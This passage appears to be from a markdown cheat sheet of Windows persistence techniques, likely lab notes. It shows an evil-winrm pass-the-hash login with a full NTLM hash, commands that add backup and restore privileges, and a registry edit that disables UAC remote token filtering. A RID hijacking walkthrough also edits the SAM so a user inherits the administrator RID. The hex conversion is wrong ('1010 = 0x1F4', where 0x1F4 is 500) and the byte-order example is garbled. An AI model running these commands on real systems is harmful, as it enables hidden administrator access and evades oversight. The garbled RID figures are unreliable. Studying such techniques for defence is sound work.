evil-winrm -i 10.10.112.47 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
```

##### *Special Privileges and Security Descriptors*

- Add `SeBackupPrivilege` and `SeRestorePrivilege` to an account.

```cmd
secedit /export /cfg config.ini
secedit /import /cfg config.ini /db config.db
secedit /configure /db config.db /cfg config.ini
```

- Change WinRM security descriptor and add user here with full control.

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

##### *RID Hijacking*

- Find RIDs of user and admin user.

```cmd
wmic useraccount get name,sid
```

- Open regedit with privileges (tool must be present on target system).

```cmd
PsExec.exe -i -s regedit
```

- Find users here in the registry: `HKLM\SAM\SAM\Domains\Account\Users\` .

- Convert (admin) RID to hex value (i.e., 1010 = 0x1F4) and change F variable within the correct user key with the RID of the admin account (little endian notation = 04F1 -> F4 01).

- Admin hex RID ussualy is F4 01, put this on line 0030 of the F variable.

<!--- 

## TITLE

### Usefull documentation

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

### Related tools

🔰 Name | ℹ️ Description | 🔗 Link
-- | -- | --
**** |  | 

<br>

--->
